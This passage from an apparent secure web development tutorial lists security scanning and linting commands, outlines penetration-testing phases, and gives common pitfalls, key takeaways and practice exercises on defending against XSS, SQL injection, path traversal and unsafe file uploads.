```

**OWASP ZAP** - Web application security scanner:

```bash
zap-cli quick-scan http://localhost:8000
zap-cli active-scan http://localhost:8000
```

**Bandit** - Python security linter:

```bash
bandit -r . -f json -o security-report.json
```

**Safety** - Check dependencies for vulnerabilities:

```bash
safety check --json
```

### 9.3 Penetration Testing Basics

**Reconnaissance**:

1. Identify input points (forms, APIs, file uploads)
2. Map application structure
3. Identify technologies used

**Vulnerability Assessment**:

1. Test each input with various payloads
2. Analyze error messages
3. Test boundary conditions

**Exploitation** (in test environment only):

1. Craft payloads targeting identified vulnerabilities
2. Test impact of successful exploitation
3. Document findings

**Reporting**:

1. Severity classification
2. Reproduction steps
3. Impact assessment
4. Remediation recommendations

---

## 10. Common Pitfalls

1. **Relying solely on client-side validation** - Always validate server-side
2. **Blacklist-based filtering** - Use whitelists instead
3. **Insufficient output encoding** - Always encode based on context
4. **Trusting file extensions** - Validate actual file content
5. **Concatenating user input into queries** - Use parameterization
6. **Inadequate error messages** - Don't leak system information
7. **Missing rate limiting on sensitive endpoints** - Prevents brute force
8. **Not sanitizing filenames** - Path traversal vulnerability
9. **Using outdated libraries** - Regular dependency updates critical
10. **Ignoring security headers** - Defense in depth requires all layers

---

## 11. Key Takeaways

1. **Never trust user input** - Validate and sanitize everything
2. **Use parameterized queries** - Only defense against SQL injection
3. **Encode output contextually** - HTML, JS, URL contexts require different encoding
4. **Validate file uploads thoroughly** - Type, size, content, filename
5. **Use Pydantic for input validation** - Type safety and validation built-in
6. **Defense in depth** - Multiple layers of protection
7. **Whitelist over blacklist** - Explicit allow list is safer
8. **Keep libraries updated** - Security patches are critical
9. **Test security regularly** - Both manual and automated testing
10. **Educate developers** - Security is everyone's responsibility

---

## 12. Practice Exercises

**Exercise 1: Secure User Profile Update**

Implement endpoint for updating user profile with:

- Username validation (alphanumeric, 3-30 chars)
- Email validation
- Bio sanitization (remove scripts, limit length)
- Profile picture upload (validate type, size, content)

**Exercise 2: Secure File Download System**

Create file sharing system with:

- Path traversal prevention
- Authorization checks
- Safe filename handling
- Rate limiting

**Exercise 3: Secure Comment System**

Build commenting system with:

- XSS prevention (HTML escaping)
- SQL injection prevention
- Input length limits
- Rate limiting

**Exercise 4: Security Audit**

Review provided codebase and:

- Identify vulnerabilities
- Classify by severity
- Propose fixes
- Write tests to verify fixes

**Exercise 5: Penetration Test**

Test provided application for:

- SQL injection
- XSS vulnerabilities
- Path traversal
- File upload vulnerabilities
- Document findings with PoC
